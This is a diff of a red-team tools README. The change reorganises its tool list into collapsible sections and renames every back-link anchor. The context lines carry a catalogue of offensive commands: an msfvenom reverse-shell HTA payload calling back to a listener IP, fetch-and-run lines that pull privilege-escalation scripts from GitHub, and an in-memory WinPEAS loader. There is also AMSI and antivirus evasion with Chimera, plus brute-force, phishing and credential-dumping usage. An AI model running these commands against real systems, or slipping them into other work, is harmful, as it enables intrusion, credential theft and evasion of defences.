@@ -4,83 +4,187 @@ This github repository contains a collection of **tools** and **resources** that
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
-> ℹ️ **Note:** *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*
+> **Warning** 
+> 
+> *The materials in this repository are for informational and educational purposes only. They are not intended for use in any illegal activities.*
 
----------------
-# Table of Contents
+> **Note** 
+> 
+> *Attack stages can be hidden.*
+> 
+> *Click 🔙 to get back to the list.*
 
-1. [Reconnaissance](#reconnaissance)
-    - [crt.sh -> httprobe -> EyeWitness](#crtsh---httprobe---eyewitness)
-    - [jsendpoints](#jsendpoints)
-    - [nuclei](#nuclei)
-    - [certSniff](#certsniff)
-    - [gobuster](#gobuster)
-    - [dnsrecon](#dnsrecon)
-    - [Shodan.io](#shodanio)
-    - [AORT (All in One Recon Tool)](#aort)
-    - [spoofcheck](#spoofcheck)
-    - [AWSBucketDump](#awsbucketdump)
-    - [GitHarvester](#githarvester)
-    - [truffleHog](#trufflehog)
-2. [Resource Development](#resource-development)
-    - [Chimera](#chimera)
-    - [msfvenom](#msfvenom)
-    - [WSH](#wsh)
-    - [HTA](#hta)
-    - [VBA](#vba)
-3. [Initial Access](#initial-access)
-    - [Bash Bunny](#bash-bunny)
-    - [EvilGoPhish](#evilgophish)
-    - [The Social-Engineer Toolkit](#social-engineer-toolkit-set)
-    - [Hydra](#hydra)
-    - [SquarePhish](#squarephish)
-    - [King Phisher](#king-phisher)
-4. [Execution](#execution)
-    - [Donut](#donut)
-    - [Macro_pack](#macro_pack)
-    - [PowerSploit](#powersploit)
-    - [Rubeus](#rubeus)
-    - [SharpUp](#sharpup)
-5. [Persistence](#persistence)
-    - [Impacket](#impacket)
-    - [Empire](#empire)
-    - [SharPersist](#sharpersist)
-6. [Privilege Escalation](#privilege-escalation)
-    - [LinPEAS](#linpeas)
-    - [WinPEAS](#winpeas)
-    - [linux-smart-enumeration](#linux-smart-enumeration)
-    - [Certify](#certify)
-    - [Get-GPPPassword](#get-gpppassword)
-7. [Defense Evasion](#defense-evasion)
-    - [Invoke-Obfuscation](#invoke-obfuscation)
-8. [Credential Access](#credential-access)
-    - [Mimikatz](#mimikatz)
-    - [LaZagne](#lazagne)
-    - [hashcat](#hashcat)
-    - [John the Ripper](#john-the-ripper)
-9. [Discovery](#discovery)
-    - [PCredz](#pcredz)
-    - [PingCastle](#pingcastle)
-10. [Lateral Movement](#lateral-movement)
-    - [crackmapexec](#crackmapexec)
-    - [Enabling RDP](#enabling-rdp)
-    - [Upgrading shell to meterpreter](#upgrading-shell-to-meterpreter)
-    - [Forwarding Ports](#forwarding-ports)
-    - [Jenkins reverse shell](#jenkins-reverse-shell)
-11. [Collection](#collection)
-    - [BloodHound](#bloodhound)
-12. [Command and Control](#command-and-control)
-    - [Havoc](#havoc)
-13. [Exfiltration](#exfiltration)
-    - [PyExfil](#pyexfil)
-    - [Powershell RAT](#powershell-rat)
-14. [Impact](#impact)
-    - ...
+# Tool List
+
+<details open>
+    <summary><b>Reconnaissance</b> $\textcolor{gray}{\text{12 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a></b><i> Automated domain screenshotting</i></li>
+            <li><b><a href="#jsendpoints">jsendpoints</a></b><i> Extract page DOM links</i></li>
+            <li><b><a href="#nuclei">nuclei</a></b><i> Vulnerability scanner</i></li>
+            <li><b><a href="#certsniff">certSniff</a></b><i> Certificate transparency log keyword sniffer</i></li>
+            <li><b><a href="#gobuster">gobuster</a></b><i> Website path brute force</i></li>
+            <li><b><a href="#dnsrecon">dnsrecon</a></b><i> Enumerate DNS records</i></li>
+            <li><b><a href="#shodanio">Shodan.io</a></b><i> Public facing system knowledge base</i></li>
+            <li><b><a href="#aort">AORT (All in One Recon Tool)</a></b><i> Subdomain enumeration</i></li>
+            <li><b><a href="#spoofcheck">spoofcheck</a></b><i> SPF/DMARC record checker</i></li>
+            <li><b><a href="#awsbucketdump">AWSBucketDump</a></b><i> S3 bucket enumeration</i></li>
+            <li><b><a href="#githarvester">GitHarvester</a></b><i> GitHub credential searcher</i></li>
+            <li><b><a href="#trufflehog">truffleHog</a></b><i> GitHub credential scanner</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Resource Development</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#chimera">Chimera</a></b><i> PowerShell obfuscation</i></li>
+            <li><b><a href="#msfvenom">msfvenom</a></b><i> Payload creation</i></li>
+            <li><b><a href="#wsh">WSH</a></b><i> Wsh payload</i></li>
+            <li><b><a href="#hta">HTA</a></b><i> Hta  payload</i></li>
+            <li><b><a href="#vba">VBA</a></b><i> Vba  payload</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Initial Access</b> $\textcolor{gray}{\text{6 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#bash-bunny">Bash Bunny</a></b><i> USB attack tool</i></li>
+            <li><b><a href="#evilgophish">EvilGoPhish</a></b><i> Phishing campaign framework</i></li>
+            <li><b><a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a></b><i> Phishing campaign framework</i></li>
+            <li><b><a href="#hydra">Hydra</a></b><i> Brute force tool</i></li>
+            <li><b><a href="#squarephish">SquarePhish</a></b><i> OAuth/QR code phishing framework</i></li>
+            <li><b><a href="#king-phisher">King Phisher</a></b><i> Phishing campaign framework</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Execution</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#donut">Donut</a></b><i> In-memory .NET execution</i></li>
+            <li><b><a href="#macro_pack">Macro_pack</a></b><i> Macro obfuscation</i></li>
+            <li><b><a href="#powersploit">PowerSploit</a></b><i> PowerShell script suite</i></li>
+            <li><b><a href="#rubeus">Rubeus</a></b><i> Active directory hack tool</i></li>
+            <li><b><a href="#sharpup">SharpUp</a></b><i> Windows vulnerability identifier</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Persistence</b> $\textcolor{gray}{\text{3 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="impacket">Impacket</a></b><i> Python script suite</i></li>
+            <li><b><a href="#empire">Empire</a></b><i> Post-exploitation framework</i></li>
+            <li><b><a href="#sharpersist">SharPersist</a></b><i> Windows persistence toolkit</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Privilege Escalation</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#linpeas">LinPEAS</a></b><i> Linux privilege escalation</i></li>
+            <li><b><a href="#winpeas">WinPEAS</a></b><i> Windows privilege escalation</i></li>
+            <li><b><a href="#linux-smart-enumeration">linux-smart-enumeration</a></b><i> Linux privilege escalation</i></li>
+            <li><b><a href="#certify">Certify</a></b><i> Active directory privilege escalation</i></li>
+            <li><b><a href="#get-gpppassword">Get-GPPPassword</a></b><i> Windows password extraction</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{1 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Credential Access</b> $\textcolor{gray}{\text{4 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#mimikatz">Mimikatz</a></b><i> Windows credential extractor</i></li>
+            <li><b><a href="#lazagne">LaZagne</a></b><i> Local password extractor</i></li>
+            <li><b><a href="#hashcat">hashcat</a></b><i> Password hash cracking</i></li>
+            <li><b><a href="#john-the-ripper">John the Ripper</a></b><i> Password hash cracking</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Discovery</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#pcredz">PCredz</a></b><i> Credential discovery PCAP/live interface</i></li>
+            <li><b><a href="#pingcastle">PingCastle</a></b><i> Active directory assessor</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
+            <li><b><a href="#enabling-rdp">Enabling RDP</a></b><i> Windows RDP enable command</i></li>
+            <li><b><a href="#upgrading-shell-to-meterpreter">Upgrading shell to meterpreter</a></b><i> Reverse shell improvement</i></li>
+            <li><b><a href="#forwarding-ports">Forwarding Ports</a></b><i> Local port forward command</i></li>
+            <li><b><a href="#jenkins-reverse-shell">Jenkins reverse shell</a></b><i> Jenkins shell command</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Collection</b> $\textcolor{gray}{\text{1 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#bloodhound">BloodHound</a></b><i> Active directory visualisation</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Command and Control</b> $\textcolor{gray}{\text{1 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#havoc">Havoc</a></b><i> Command and control framework</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Exfiltration</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#pyexfil">PyExfil</a></b><i> Data exfiltration PoC</i></li>
+            <li><b><a href="#powershell-rat">Powershell RAT</a></b><i> Python based backdoor</i></li>
+        </ul>
+    </ul>
+</details>
+
+<details open>
+    <summary><b>Impact</b> $\textcolor{gray}{\text{0 tools}}$</summary>
+    <ul>
+        <ul>
+            <li><b><a href="#">...</a></b><i> ...</i></li>
+        </ul>
+    </ul>
+</details>
     
 Reconnaissance
 ====================
 
-### [🔙](#redteam-tools)crt.sh -> httprobe -> EyeWitness
+### [🔙](#tool-list)crt.sh -> httprobe -> EyeWitness
 
 I have put together a bash one-liner that: 
 - Passively collects a list of subdomains from certificate associations ([crt.sh](https://crt.sh/))
@@ -99,7 +203,7 @@ domain=DOMAIN_COM;rand=$RANDOM;curl -fsSL "https://crt.sh/?q=${domain}" | pup 't
 
 ![image](https://user-images.githubusercontent.com/100603074/192104501-e038aff8-1e51-4cc3-a286-54e93408ed4e.png)
 
-### [🔙](#redteam-tools)[jsendpoints](https://twitter.com/renniepak/status/1602620834463588352)
+### [🔙](#tool-list)[jsendpoints](https://twitter.com/renniepak/status/1602620834463588352)
 
 A JavaScript bookmarklet for extracting all webpage endpoint links on a page.
 
@@ -128,7 +232,7 @@ Paste the above Javascript into the console window `F12` and press enter.
 
 ![image](https://user-images.githubusercontent.com/100603074/207563598-d70171b5-823e-491e-a6d5-8657af28b0e5.png)
 
-### [🔙](#redteam-tools)[nuclei](https://github.com/projectdiscovery/nuclei)
+### [🔙](#tool-list)[nuclei](https://github.com/projectdiscovery/nuclei)
 
 Fast vulnerability scanner that uses .yaml templates to search for specific issues.
 
@@ -146,7 +250,7 @@ cat domains.txt | nuclei -t /PATH/nuclei-templates/
 
 ![image](https://user-images.githubusercontent.com/100603074/205439027-2afe4ef8-fc7a-410d-934f-f8d325a8176e.png)
 
-### [🔙](#redteam-tools)[certSniff](https://github.com/A-poc/certSniff)
+### [🔙](#tool-list)[certSniff](https://github.com/A-poc/certSniff)
 
 certSniff is a Certificate Transparency logs keyword watcher I wrote in Python. It uses the certstream library to watch for certificate creation logs that contain keywords, defined in a file.
 
@@ -166,7 +270,7 @@ python3 certSniff.py -f example.txt
 
 ![image](https://user-images.githubusercontent.com/100603074/206023792-ef251912-00c0-48e1-8691-71438cf7dd11.png)
 
-### [🔙](#redteam-tools)[gobuster](https://www.kali.org/tools/gobuster/)
+### [🔙](#tool-list)[gobuster](https://www.kali.org/tools/gobuster/)
 
 Nice tool for brute forcing file/folder paths on a victim website.
 
@@ -185,7 +289,7 @@ gobuster dir -u "https://google.com" -w /usr/share/wordlists/dirb/big.txt --wild
 ![image](https://user-images.githubusercontent.com/100603074/192146594-86f04a85-fce3-4c4c-bcd6-2bf6a6222241.png)
 
 
-### [🔙](#redteam-tools)[dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)
+### [🔙](#tool-list)[dnsrecon](https://www.kali.org/tools/dnsrecon/#dnsrecon)
 
 dnsrecon is a pyhton tool for enumerating DNS records (MX, SOA, NS, A, AAAA, SPF and TXT) and can provide a number of new associated victim hosts to pivot into from a single domain search.
 
@@ -203,13 +307,13 @@ dnsrecon -d google.com
 
 ![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)
 
-### [🔙](#redteam-tools)[shodan.io](https://www.shodan.io/dashboard)
+### [🔙](#tool-list)[shodan.io](https://www.shodan.io/dashboard)
 
 Shodan crawls public infrastructure and displays it in a searchable format. Using a company name, domain name, IP address it is possible to discover potentially vulnerable systems relating to your target via shodan.
 
 ![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)
 
-### [🔙](#redteam-tools)[AORT](https://github.com/D3Ext/AORT)
+### [🔙](#tool-list)[AORT](https://github.com/D3Ext/AORT)
 
 Tool for enumerating subdomains, enumerating DNS, WAF detection, WHOIS, port scan, wayback machine, email harvesting.
 
@@ -227,7 +331,7 @@ python3 AORT.py -d google.com
 
 ![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)
 
-### [🔙](#redteam-tools)[spoofcheck](https://github.com/BishopFox/spoofcheck)
+### [🔙](#tool-list)[spoofcheck](https://github.com/BishopFox/spoofcheck)
 
 A program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. Additionally it will alert if the domain has DMARC configuration that sends mail or HTTP requests on failed SPF/DKIM emails.
 
@@ -251,7 +355,7 @@ git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r
 
 ![image](https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png)
 
-### [🔙](#redteam-tools)[AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
+### [🔙](#tool-list)[AWSBucketDump](https://github.com/jordanpotti/AWSBucketDump)
 
 AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for interesting files. It's similar to a subdomain bruteforcer but is made specifically for S3 buckets and also has some extra features that allow you to grep for files, as well as download interesting files.
 
@@ -278,7 +382,7 @@ optional arguments:
  python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1
 ```
 
-### [🔙](#redteam-tools)[GitHarvester](https://github.com/metac0rtex/GitHarvester)
+### [🔙](#tool-list)[GitHarvester](https://github.com/metac0rtex/GitHarvester)
 
 Nice tool for finding information from GitHub with regex, with the ability to search specific GitHub users and/or projects.
 
@@ -294,7 +398,7 @@ git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester
 ./githarvester.py
 ```
 
-### [🔙](#redteam-tools)[truffleHog](https://github.com/dxa4481/truffleHog)
+### [🔙](#tool-list)[truffleHog](https://github.com/dxa4481/truffleHog)
 
 TruffleHog is a tool that scans git repositories and looks for high-entropy strings and patterns that may indicate the presence of secrets, such as passwords and API keys. With TruffleHog, you can quickly and easily find sensitive information that may have been accidentally committed and pushed to a repository.
 
@@ -318,7 +422,7 @@ trufflehog https://github.com/trufflesecurity/test_keys
 Resource Development
 ====================
 
-### [🔙](#redteam-tools)[Chimera](https://github.com/tokyoneon/Chimera)
+### [🔙](#tool-list)[Chimera](https://github.com/tokyoneon/Chimera)
 
 Chimera is a PowerShell obfuscation script designed to bypass AMSI and antivirus solutions. It digests malicious PS1's known to trigger AV and uses string substitution and variable concatenation to evade common detection signatures.
 
@@ -341,7 +445,7 @@ invoke-expression,out-string,write-error -j -g -k -r -p
 
 ![image](https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png)
 
-### [🔙](#redteam-tools)[msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)
+### [🔙](#tool-list)[msfvenom](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)
 
 Msfvenom allows the creation of payloads for various operating systems in a wide range of formats. It also supports obfuscation of payloads for AV bypass.
 
@@ -389,7 +493,7 @@ msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > s
 
 ![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)
 
-### [🔙](#redteam-tools)WSH
+### [🔙](#tool-list)WSH
 
 **Creating payload:** 
 
@@ -406,7 +510,7 @@ cscript.exe payload.vbs
 wscript /e:VBScript payload.txt //If .vbs files are blacklisted
 ```
 
-### [🔙](#redteam-tools)HTA
+### [🔙](#tool-list)HTA
 
 **Creating payload:**
 
@@ -423,7 +527,7 @@ wscript /e:VBScript payload.txt //If .vbs files are blacklisted
 
 **Execute:** Run file
 
-### [🔙](#redteam-tools)VBA
+### [🔙](#tool-list)VBA
 
 **Creating payload:**
 
@@ -440,7 +544,7 @@ End Sub
 Initial Access
 ====================
 
-### [🔙](#redteam-tools)[Bash Bunny](https://shop.hak5.org/products/bash-bunny)
+### [🔙](#tool-list)[Bash Bunny](https://shop.hak5.org/products/bash-bunny)
 
 The Bash Bunny is a physical USB attack tool and multi-function payload delivery system. It is designed to be plugged into a computer's USB port and can be programmed to perform a variety of functions, including manipulating and exfiltrating data, installing malware, and bypassing security measures.
 
@@ -454,7 +558,7 @@ The Bash Bunny is a physical USB attack tool and multi-function payload delivery
 
 ![image](https://user-images.githubusercontent.com/100603074/209868292-cc02ce20-7d8e-4019-b953-7082fb0eb828.png)
 
-### [🔙](#redteam-tools)[EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)
+### [🔙](#tool-list)[EvilGoPhish](https://github.com/fin3ss3g0d/evilgophish)
 
 evilginx2 + gophish. (GoPhish) Gophish is a powerful, open-source phishing framework that makes it easy to test your organization's exposure to phishing. (evilginx2) Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication
 
@@ -482,7 +586,7 @@ Example:
 
 ![image](https://user-images.githubusercontent.com/100603074/191007680-890acda1-72ec-429e-9c91-b2cae55d7189.png)
 
-### [🔙](#redteam-tools)[Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)
+### [🔙](#tool-list)[Social Engineer Toolkit (SET)](https://github.com/IO1337/social-engineering-toolkit)
 
 This framework is great for creating campaigns for initial access, 'SET has a number of custom attack vectors that allow you to make a believable attack quickly'.
 
@@ -500,7 +604,7 @@ python3 setoolkit
 
 ![image](https://user-images.githubusercontent.com/100603074/191690233-e1f4255a-514e-4887-94da-b8a3396025f0.png)
 
-### [🔙](#redteam-tools)[Hydra](https://github.com/vanhauser-thc/thc-hydra)
+### [🔙](#tool-list)[Hydra](https://github.com/vanhauser-thc/thc-hydra)
 
 Nice tool for logon brute force attacks. Can bf a number of services including SSH, FTP, TELNET, HTTP etc.
 
@@ -519,7 +623,7 @@ hydra -L USER.TXT -P PASS.TXT 1.1.1.1 ssh
 
 ![image](https://user-images.githubusercontent.com/100603074/193459614-365876d5-09da-4f29-b850-0480944f0097.png)
 
-### [🔙](#redteam-tools)[SquarePhish](https://github.com/secureworks/squarephish)
+### [🔙](#tool-list)[SquarePhish](https://github.com/secureworks/squarephish)
 
 SquarePhish is an advanced phishing tool that uses a technique combining  OAuth Device code authentication flow and QR codes (See [PhishInSuits](https://github.com/secureworks/PhishInSuits) for more about OAuth Device Code flow for phishing attacks).
 
@@ -575,7 +679,7 @@ optional arguments:
 ![image](https://user-images.githubusercontent.com/100603074/208217359-70e3ebd4-5cbf-40b9-9e4b-ca1608e4422f.png)
  
 
-### [🔙](#redteam-tools)[King Phisher](https://github.com/securestate/king-phisher)
+### [🔙](#tool-list)[King Phisher](https://github.com/securestate/king-phisher)
 
 King Phisher is a tool that allows attackers to create and send phishing emails to victims to obtain sensitive information.
 
@@ -597,7 +701,7 @@ Once King Phisher has been installed please follow the [wiki page](https://githu
 Execution
 ====================
 
-### [🔙](#redteam-tools)[Donut](https://github.com/TheWover/donut/)
+### [🔙](#tool-list)[Donut](https://github.com/TheWover/donut/)
 
 A tool for in-memory execution of VBScript, JScript, EXE, DLL files and dotNET assemblies. It can be used to load and run custom payloads on target systems without the need to drop files to disk.
 
@@ -641,7 +745,7 @@ See [a recent blog post](https://thewover.github.io/Bear-Claw/) from The Wover f
 
 ![image](https://user-images.githubusercontent.com/100603074/210077893-9d42cc2f-0ea0-414f-8103-42e29429321b.png)
 
-### [🔙](#redteam-tools)[Macro_pack](https://github.com/sevagas/macro_pack)
+### [🔙](#tool-list)[Macro_pack](https://github.com/sevagas/macro_pack)
 
 A tool used to automatize the obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for red teaming.
 
@@ -683,7 +787,7 @@ echo calc.exe | macro_pack.exe --dde -G calc.xslx
 
 ![image](https://user-images.githubusercontent.com/100603074/209868800-7fbcfdec-8ae8-4693-8438-feebc2309667.png)
 
-### [🔙](#redteam-tools)[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
+### [🔙](#tool-list)[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 
 A collection of PowerShell scripts and modules that can be used to achieve a variety of red teaming objectives.
 
@@ -730,7 +834,7 @@ Get-Command -Module PowerSploit
 ![image](https://user-images.githubusercontent.com/100603074/208247898-481f48c0-fe51-482f-b7c6-463bfecbd581.png)
 
 
-### [🔙](#redteam-tools)[Rubeus](https://github.com/GhostPack/Rubeus)
+### [🔙](#tool-list)[Rubeus](https://github.com/GhostPack/Rubeus)
 
 A tool that can be used to perform various actions related to Microsoft Active Directory (AD) environments, such as dumping password hashes, creating/deleting users, and modifying user properties.
 
@@ -757,7 +861,7 @@ Rubeus.exe -h
 ![image](https://user-images.githubusercontent.com/100603074/208250015-674a6fee-95b7-4edf-bd59-fe459cd235ed.png)
 
 
-### [🔙](#redteam-tools)[SharpUp](https://github.com/GhostPack/SharpUp)
+### [🔙](#tool-list)[SharpUp](https://github.com/GhostPack/SharpUp)
 
 A nice tool for checking a victims endpoint for vulnerabilites relating to high integrity processes, groups, hijackable paths, etc.
 
@@ -787,7 +891,7 @@ SharpUp.exe audit HijackablePaths
 Persistence
 ====================
 
-### [🔙](#redteam-tools)[Impacket](https://github.com/fortra/impacket)
+### [🔙](#tool-list)[Impacket](https://github.com/fortra/impacket)
 
 Impacket provides a set of low-level Python bindings for various network protocols, including SMB, Kerberos, and LDAP, as well as higher-level libraries for interacting with network services and performing specific tasks such as dumping password hashes and creating network shares.
 
@@ -827,7 +931,7 @@ Great [cheat sheet](https://cheatsheet.haax.fr/windows-systems/exploitation/impa
 
 ![image](https://user-images.githubusercontent.com/100603074/210079475-a13f7fe2-7801-40dd-977b-e179d0658b47.png)
 
-### [🔙](#redteam-tools)[Empire](https://github.com/EmpireProject/Empire)
+### [🔙](#tool-list)[Empire](https://github.com/EmpireProject/Empire)
 
 Empire is a post-exploitation framework that allows you to generate payloads for establishing remote connections with victim systems.
 
@@ -860,7 +964,7 @@ Nice usage [cheat sheet](https://github.com/HarmJ0y/CheatSheets/blob/master/Empi
 
 ![image](https://user-images.githubusercontent.com/100603074/210080911-b3c7572a-a0dd-4664-a3e1-46b343db8a79.png)
 
-### [🔙](#redteam-tools)[SharPersist](https://github.com/mandiant/SharPersist)
+### [🔙](#tool-list)[SharPersist](https://github.com/mandiant/SharPersist)
 
 A Windows persistence toolkit written in C#.
 
@@ -906,7 +1010,7 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 Privilege Escalation
 ====================
 
-### [🔙](#redteam-tools)[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+### [🔙](#tool-list)[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
 LinPEAS is a nice verbose privilege escalation for finding local privesc routes on Linux endpoints. 
 
@@ -918,7 +1022,7 @@ curl -L "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpea
 
 ![image](https://user-images.githubusercontent.com/100603074/192070104-8a121544-5c88-4c24-8b2e-590700b345e7.png)
 
-### [🔙](#redteam-tools)[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+### [🔙](#tool-list)[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
 
 WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints. 
 
@@ -930,7 +1034,7 @@ $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://githu
 
 ![image](https://user-images.githubusercontent.com/100603074/192070193-fed8a0e8-b82a-4338-9209-6352f33ab6b8.png)
 
-### [🔙](#redteam-tools)[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
+### [🔙](#tool-list)[linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 
 Linux smart enumeration is another good, less verbose, linux privesc tool for Linux.
 
@@ -942,7 +1046,7 @@ curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/d
 
 ![image](https://user-images.githubusercontent.com/100603074/192070258-2fe8727a-4b75-430d-a84e-da6605750de9.png)
 
-### [🔙](#redteam-tools)[Certify](https://github.com/GhostPack/Certify)
+### [🔙](#tool-list)[Certify](https://github.com/GhostPack/Certify)
 
 Certify is a C# tool to enumerate and abuse misconfigurations in Active Directory Certificate Services (AD CS).
 
@@ -995,7 +1099,7 @@ Full example walkthrough can be found [here](https://github.com/GhostPack/Certif
 
 ![image](https://user-images.githubusercontent.com/100603074/210088651-28899ba5-cbbd-4b03-8000-068fd401476d.png)
 
-### [🔙](#redteam-tools)[Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
+### [🔙](#tool-list)[Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
 
 Get-GPPPassword is a PowerShell script part of the PowerSploit toolkit, it is designed to retrieve passwords for local accounts that are created and managed using Group Policy Preferences (GPP).
 
@@ -1025,7 +1129,7 @@ Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
 Defense Evasion
 ====================
 
-### [🔙](#redteam-tools)[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
+### [🔙](#tool-list)[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 
 A PowerShell v2.0+ compatible PowerShell command and script obfuscator. If a victim endpoint is able to execute PowerShell then this tool is great for creating heavily obfuscated scripts.
 
@@ -1046,7 +1150,7 @@ git clone https://github.com/danielbohannon/Invoke-Obfuscation.git
 Credential Access
 ====================
 
-### [🔙](#redteam-tools)[Mimikatz](https://github.com/gentilkiwi/mimikatz)
+### [🔙](#tool-list)[Mimikatz](https://github.com/gentilkiwi/mimikatz)
 
 Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained privileged access to a system, drop this tool to collect some creds.
 
@@ -1064,7 +1168,7 @@ privilege::debug
 
 ![image](https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png)
 
-### [🔙](#redteam-tools)[LaZagne](https://github.com/AlessandroZ/LaZagne)
+### [🔙](#tool-list)[LaZagne](https://github.com/AlessandroZ/LaZagne)
 
 Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.
 
@@ -1088,7 +1192,7 @@ You can install the standalone binary from [here](https://github.com/AlessandroZ
 ![image](https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png)
 
 
-### [🔙](#redteam-tools)[hashcat](https://github.com/hashcat/hashcat)
+### [🔙](#tool-list)[hashcat](https://github.com/hashcat/hashcat)
 
 Tool for cracking password hashes. Supports a large list of hashing algorithms (Full list can be found [here](https://hashcat.net/wiki/doku.php?id=example_hashes)).
 
@@ -1106,7 +1210,7 @@ Nice hashcat command [cheatsheet](https://cheatsheet.haax.fr/passcracking-hashfi
 
 ![image](https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png)
 
-### [🔙](#redteam-tools)[John the Ripper](https://github.com/openwall/john)
+### [🔙](#tool-list)[John the Ripper](https://github.com/openwall/john)
 
 Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.
 
@@ -1128,7 +1232,7 @@ john
 Discovery
 ====================
 
-### [🔙](#redteam-tools)[PCredz](https://github.com/lgandx/PCredz)
+### [🔙](#tool-list)[PCredz](https://github.com/lgandx/PCredz)
 
 This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.
 
@@ -1152,7 +1256,7 @@ python3 ./Pcredz -i eth0 -v
 
 ![image](https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png)
 
-### [🔙](#redteam-tools)[PingCastle](https://github.com/vletoux/pingcastle)
+### [🔙](#tool-list)[PingCastle](https://github.com/vletoux/pingcastle)
 
